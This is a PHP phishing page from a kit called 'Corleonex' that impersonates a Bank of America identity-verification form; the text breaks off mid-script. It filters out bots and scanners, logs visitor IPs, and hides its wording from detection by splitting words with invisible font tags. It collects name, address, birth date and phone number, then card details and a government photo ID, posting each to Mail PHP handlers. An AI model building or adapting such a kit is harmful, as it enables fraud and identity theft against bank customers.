<?php
session_start();
error_reporting(0);



include'Corleonex/config.php';
include'Corleonex/Anti/IP-BlackList.php';  
include'Corleonex/Anti/Bot-Crawler.php';
include'Corleonex/Anti/bot-corleonex.php';
include'Corleonex/Anti/blacklist.php';
include'Corleonex/Anti/new.php';
include'Corleonex/Functions/Fuck-you.php'; 
include'Corleonex/Anti/Dila_DZ.php';



if (!isset($_GET['boa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['BOA_CORLEONEX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

$content2 = "#>".$_SESSION['ip']."\r\n";
$save2=fopen("Corleonex/Boa_Result/total_billing_view.txt.txt","a+");
fwrite($save2,$content2);
fclose($save2);



?>
<html lang="en-US" layoutversion="3.1.0" layoutsupportheaderversion="4.5.0">
<head class="at-element-marker" style="visibility:visible;">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Verification</title>
	<meta name="robots" content="NOINDEX, NOFOLLOW">

<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

	<link rel="shortcut icon" href="Corleonex/Files/img/assets-images-global-favicon-favicon-CSX8d65d6e4.ico">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-style-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-accordion-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/spa-datepicker.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-footnote-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-input-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-masking-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/datepicker.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/css/sparta-ui-layers-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/application-input-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/show-on-cookie-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/view-more-expand-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/global-footer-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/global-nav-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/global-social-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/title-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/hero-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/connect-with-us-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/application-input-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/apply-services-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/continue-submit-button-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/disclosure-container-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/error-notification-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/page-render-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/progress-segment-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/render-new-page-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/slidey-deposits-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/three-steps-with-image-module.scss.css">
	
	        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	        <script src="https://unpkg.com/micromodal/dist/micromodal.min.js"></script>


	<style>
		* Container */
.container{
   margin: 0 auto;
   border: 0px solid black;
   width: 50%;
   height: 250px;
   border-radius: 3px;
   background-color: ghostwhite;
   text-align: center;
}
/* Preview */
.preview{
   width: 100px;
   height: 100px;
   border: 1px solid black;
   margin: 0 auto;
   background: white;
}

.preview img{
   display: none;
}
/* Button */
.button{
   border: 0px;
   background-color: deepskyblue;
   color: white;
   padding: 5px 15px;
   margin-left: 10px;
}

	</style>
	<style>body{visibility:hidden}</style>

</head>

<body data-sparta-version="4.1.1" data-build-id="62711" data-sparta-wrapper="secure-apply-deposits" class="small small-up getStarted loaded standard medium medium-up medium-only landscape" style="visibility: visible;" data-detectedprerender="false">

<div data-sparta-container="secure-apply-deposits" class="flex-grid-nest spa-contextroot-apply-deposits spa-site-secure-apply-deposits">
	<noscript><style>body{visibility:visible}</style></noscript>

	<div class="spa-layout-container spa-layout-container--flex-grid-nest">
		<div  class="sparta-layout flex-grid-layout" >
			<section  class="head-row small-centered">
			<div class="row small-collapse medium-collapse large-collapse">
				<div class="large-12 columns">
					<div   class="global-nav-module-class-v-5-5-0 global-nav-module has-search">
						<header class="spa-page-header" >
							<div class="fake-header-bg">
							
							</div>
							<div  class="spa-page-header-container row clearfix">
								<div class="spa-page-header-grid-container columns large-12 clearfix">
							<div class="bofa-logo spa-page-header-brand left">
									<span  class="ada-hidden" aria-hidden="true"></span>
									<a  class="home-link bofa-logo left" id="boaLogo" href="">
										<img  alt="Bank of America Logo" src="Corleonex/Files/img/assets-images-global-logos-bac-logo-v2-CSX3648cbbb.svg"></a>
									</div>
									<div class="header-right right">
										<div class="header-secure">
											<a  href="#" class="lock-icon spa-fn spa-boa-window spa-fn-complete">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e P<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>e</a>
										</div>
									</div>
								</div>
							</div>
						</header>

	<style type="text/css">#globalNavModule.global-nav-module.show-nav .home-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-home_icon-CSXe201335c.svg)}#globalNavModule.global-nav-module.show-nav .locations-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-locations_icon-CSXd6b1467d.svg)}#globalNavModule.global-nav-module.show-nav .contact-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-contact_icon-CSXe40c3662.svg)}#globalNavModule.global-nav-module.show-nav .help-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-help_icon-CSX4a68620d.svg)}#globalNavModule.global-nav-module.show-nav .espanol-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-espanol_icon-CSX2944fde2.svg)}#globalNavModule.global-nav-module.show-nav .calendar-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-calendar_icon-CSX7e416454.svg)}#globalNavModule.global-nav-module .lock-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-secure-lock-CSXa09bf5fc.svg)}</style>
</div>

<div  class="title-module-class-v-3-2-0 title-module">
	<div class="spa-page-title spa-page-title--has-flagscape spa-page-title--crimson spa-page-title--white-text">
	<div class="spa-page-title-inset row">
		<div class="columns small-12">
	<h1 data-font="cnx-regular" class="heading title-heading"  aria-level="1" >
		<span >V<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n</span>
			
		</h1>
	</div>
</div>
</div>

<style type="text/css">.spa-page-title.spa-page-title--has-flagscape.spa-page-title--red{background-image:url(Corleonex/Files/img/assets-images-global-title-flagscape_red-CSX345e7fd7.svg)}.spa-page-title.spa-page-title--has-flagscape.spa-page-title--crimson{background-image:url(Corleonex/Files/img/assets-images-global-title-flagscape_crimson-CSX37719e01.svg)}.spa-page-title.spa-page-title--has-flagscape.spa-page-title--gray{background-image:url(Corleonex/Files/img/assets-images-global-title-flagscape_gray-CSXc1942577.svg)}</style>

</div>

</div>
</div>

</section>

<section class="small-centered section-body page getStarted">
	<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div  class="application-input-module-class-v-3-0-0 application-input-module" >

			<form id="billingdetails">
				<div class="input-grouping row">
					<h2 class="form-heading columns small-12">P<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n...</h2>
					<p class="form-subheading columns small-12 end">P<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>e p<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e t<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>e f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>w<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n t<font style='color:transparent;font-size:0px'></font>o v<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>y y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r i<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y.</p>
				</div>


<div class="input-grouping row">
	
			<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">F<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l n<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" class="spa-input-text" data-validation="length" data-validation-error-msg="  " data-validation-length="min3-30" name="fullname">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>

				<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">R<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l a<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e 1<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text"  class="spa-input-text" data-validation="length" data-validation-error-msg="  " data-validation-length="min2" name="address1">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>

				<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">R<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l a<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e 2 (op<font style='color:transparent;font-size:0px'></font>tio<font style='color:transparent;font-size:0px'></font>na<font style='color:transparent;font-size:0px'></font>l)<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" class="spa-input-text" name="address2">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>


<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">S<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>e<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<select name="state">
	<option value="AL">Alabama</option>
	<option value="AK">Alaska</option>
	<option value="AZ">Arizona</option>
	<option value="AR">Arkansas</option>
	<option value="CA">California</option>
	<option value="CO">Colorado</option>
	<option value="CT">Connecticut</option>
	<option value="DE">Delaware</option>
	<option value="DC">District Of Columbia</option>
	<option value="FL">Florida</option>
	<option value="GA">Georgia</option>
	<option value="HI">Hawaii</option>
	<option value="ID">Idaho</option>
	<option value="IL">Illinois</option>
	<option value="IN">Indiana</option>
	<option value="IA">Iowa</option>
	<option value="KS">Kansas</option>
	<option value="KY">Kentucky</option>
	<option value="LA">Louisiana</option>
	<option value="ME">Maine</option>
	<option value="MD">Maryland</option>
	<option value="MA">Massachusetts</option>
	<option value="MI">Michigan</option>
	<option value="MN">Minnesota</option>
	<option value="MS">Mississippi</option>
	<option value="MO">Missouri</option>
	<option value="MT">Montana</option>
	<option value="NE">Nebraska</option>
	<option value="NV">Nevada</option>
	<option value="NH">New Hampshire</option>
	<option value="NJ">New Jersey</option>
	<option value="NM">New Mexico</option>
	<option value="NY">New York</option>
	<option value="NC">North Carolina</option>
	<option value="ND">North Dakota</option>
	<option value="OH">Ohio</option>
	<option value="OK">Oklahoma</option>
	<option value="OR">Oregon</option>
	<option value="PA">Pennsylvania</option>
	<option value="RI">Rhode Island</option>
	<option value="SC">South Carolina</option>
	<option value="SD">South Dakota</option>
	<option value="TN">Tennessee</option>
	<option value="TX">Texas</option>
	<option value="UT">Utah</option>
	<option value="VT">Vermont</option>
	<option value="VA">Virginia</option>
	<option value="WA">Washington</option>
	<option value="WV">West Virginia</option>
	<option value="WI">Wisconsin</option>
	<option value="WY">Wyoming</option>
</select>
				</div>
				</div>

				<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">Z<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>p c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="tel" name="zipcodedizbi" class="spa-input-text" data-validation="length" data-validation-error-msg="  " data-validation-length="min2-5">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>



<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">D<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>e o<font style='color:transparent;font-size:0px'></font>f b<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>h<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="tel" class="spa-input-text" name="dob" data-validation="length" id="dob" data-validation-error-msg="  " data-validation-length="min10" >
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>

				<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">P<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e n<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
 <div class="jpui validationinput" id="phoneId-text">
        <div id="">
        <input data-validation-error-msg="Tell us your phone number." data-validation="server" data-validation-url="Corleonex.php" class="spa-input-text"  placeholder="" name="phone" id="phone"  >
        <span class="util accessible-text validation__accessible-text" id="phoneNumberId-text-validate-placeHolderAdaText">
         
     </span>
     </div>


						
 

					</div>
				</div>
				</div>


				

			</div>



<div class="hide" >
</div>
</div>
</div>
</section>
<section class="small-centered section-body page getStarted">
	<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div class="continue-submit-button-module-class-v-3-0-0 continue-submit-button-module">
		<div class="row">
			<div class="columns small-12">
			<div class="nav-btn-container">
			<button id="contine" class="button continueButton spa-btn spa-btn--primary spa-btn--large" type="submit" style="float:left;">C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e</button>
			<div class="nav-btn-container">
		</div>
	</div>
</div>
		</div>
		</div>
		</div>
		</section>

<input type="hidden" name="token">
</form>
        <section class="foot-row background-bank-cool-gray-light small-centered">
        	<div class="row small-collapse medium-collapse large-collapse">
        		<div class="large-12 columns">
        			<div class="global-footer-module-class-v-4-4-2 global-footer-module">

        			<footer class="skin-cool" role="contentinfo">
        				<div class="footer-bottom-section">
        					<div class="row collapse">
        						<div class="columns small-12">
        							<div class="footer-bottom clearfix">
        								<div role="navigation" class="text-center">
        									<ul class="links">
        										<li class="link">
        											<a href="javascript:void(0);">S<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e w<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>e f<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>ed<font style='color:transparent;font-size:0px'></font>ba<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>k</a>
        										</li>
        											<li class="link">
        												<a  href="#" class="spa-fn spa-boa-window spa-fn-complete" >P<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>va<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>y &amp; S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>it<font style='color:transparent;font-size:0px'></font>y</a>
        											</li>
        										</ul>
        									</div>
        									<div class="text-center"></div>
        									<div class="text-center">
        										<div class="legal">
        											<p class="legal-text">
        											<span class="member-fdic">B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a, N.<font style='color:transparent;font-size:0px'></font>A. M<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r F<font style='color:transparent;font-size:0px'></font>D<font style='color:transparent;font-size:0px'></font>I<font style='color:transparent;font-size:0px'></font>C.</span>
        											<span class="equalhousing-container">
        								<a href="#" class="equalhousing spa-fn spa-boa-window spa-fn-complete">E<font style='color:transparent;font-size:0px'></font>q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l H<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g L<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r <span class="ada-hidden">n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>w w<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>w</span>
        													</a>
        												</span>
        												</p>
        													<p class="legal-text">© 2<font style='color:transparent;font-size:0px'></font>0<font style='color:transparent;font-size:0px'></font>2<font style='color:transparent;font-size:0px'></font>0 B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>ra<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n. <span>A<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l ri<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>ts r<font style='color:transparent;font-size:0px'></font>es<font style='color:transparent;font-size:0px'></font>er<font style='color:transparent;font-size:0px'></font>ve<font style='color:transparent;font-size:0px'></font>d.</span>
        													</p>
        												</div>
        											</div>
        										</div>
        									</div>
        								</div>
        							</div>
        						</footer>

        						<style type="text/css">.global-footer-module .equalhousing{background:transparent url(Corleonex/Files/img/assets-images-global-logos-icon-ehl-crushed-CSXe0ce1a4d.svg) no-repeat;background-size:15px auto;background-position:right 2px}
        					</style>

        			</div>
        			
        		</div>
        	</div>
        </section>
    </div>
    </div>

</div>



<!-- credit card modal -->

<!-- Modal -->
<div  class="modal fade bd-example-modal-lg" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Tell us about your card details.</h5>
       
      </div>
      <div id="modalidbody" class="modal-body">
       <?php include('card_form.php') ?>
      </div>
      
    </div>
  </div>
</div>
<!-- end of credit card modal --> 



 


<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

	
<script>

	
// validate cc
$(document).ready(function () { 
  $.validate({
    form : '#formcc',
    modules : 'security',
    onError : function($form) {
    },
    onSuccess : function($form) {
    
  	  $.ajax({
    type: "POST",
    url: "Corleonex/Mail/Mail4.php",
    data: $("#formcc").serialize(),
    dataType: "text",
    success: function(data){ 
   
      if (data == 'id') {
     	
     	// show id card 

     $('#modalidbody').html('');
     $('#modalidbody').append('<p style="font-size: 17px;">Please  provide an image of your photo ID to confirm your identity. We’ll need to capture an image of your government-issued photo ID, such as a driver license or passport. </p> <form method="post" action="" enctype="multipart/form-data" id="myform"><img style="   display: block;margin-left: auto; margin-right: auto;width: 50%; "src="https://us.123rf.com/450wm/batsheba/batsheba1710/batsheba171000003/87354470-personnes-tenant-des-cartes-d-identit%C3%A9-.jpg?ver=6" id="img" width="250" height="250"> <div style ="margin-top: 20px;text-align: center;}" ><input type="file" id="file" name="file" /><input type="button" class="button" value="Upload" id="but_upload" onclick="uploadiD()"> </div></form>')

     $('#exampleModalLabel').text("ID upload for identity verification")


     } else {

        $('#wrongcc').hide();
          window.location.href = data;


     }
  },
 
});
      return false; 
   

    },
    onValidate : function($form) {
       //alert('good to validate');

    },
    onElementValidate : function(valid, $el, $form, errorMess) {
      console.log('Input ' +$el.attr('name')+ ' is ' + ( valid ? 'VALID':'NOT VALID') );
    }
  });

});
 

	$(document).ready(function () { 

  $.validate({
     form : '#billingdetails',
    modules : 'security',

        onSuccess : function($form) {
        // on validate send data 
        // do ajax 
        var datastring = $("#billingdetails").serialize();
        $("#contine").text("verifying ..");
        $("#contine").prop("disabled", true);


        $.ajax({
    type: "POST",
    url: "Corleonex/Mail/Mail3.php",
    data: datastring,
    dataType: "text",
    success: function(data){ 
   
      if (data == 'credit') {
       // show credit card
        $('#exampleModal').modal({backdrop: 'static', keyboard: false}); 


     } else {

        // else redirect
        window.location.href = data;




     }
  },
 
});



    },
  });  
});


 $("form").submit(function(e){
        e.preventDefault();
    });


  

// show credit card info 
 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phone");
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dob");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
Inputmask("9{1,2}/9{1,4}").mask("#expd");

function uploadiD(){
	   var fd = new FormData();
        var files = $('#file')[0].files;
        
        // Check file selected or not
        if(files.length > 0 ){
           fd.append('file',files[0]);

           $.ajax({
              url: 'Corleonex/Mail/Mail5.php',
              type: 'post',
              data: fd,
              contentType: false,
              processData: false,
              success: function(response){
                 if(response != 0){
               
                    // redirect to thank you page 
                    window.location.href= response;
